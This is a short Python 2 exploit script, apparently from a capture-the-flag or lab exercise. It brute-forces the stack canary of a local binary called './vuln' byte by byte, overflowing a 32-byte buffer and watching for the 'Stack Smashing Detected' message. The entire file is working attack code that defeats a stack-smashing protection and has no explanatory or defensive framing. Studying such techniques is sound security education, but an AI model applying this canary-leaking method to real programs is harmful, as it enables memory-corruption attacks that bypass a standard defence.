import subprocess

def call(sz, t):
  assert sz>=32
  payload = ""
  payload += "%i\n" % sz # size of our input
  payload += "A" * 32 # To fill the buf buffer
  payload += chr(t[0]) + chr(t[1]) + chr(t[2]) + chr(t[3]) + '\n'

  p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
  (stdout, stderror) = p.communicate(payload)

  #print stdout
  return "Stack Smashing Detected" not in stdout

canary = [0, 0, 0, 0]

for i in xrange(4):
  for j in xrange(256):
    canary[i] = j
    if call(33 + i, canary):
      print "%i" % j
      break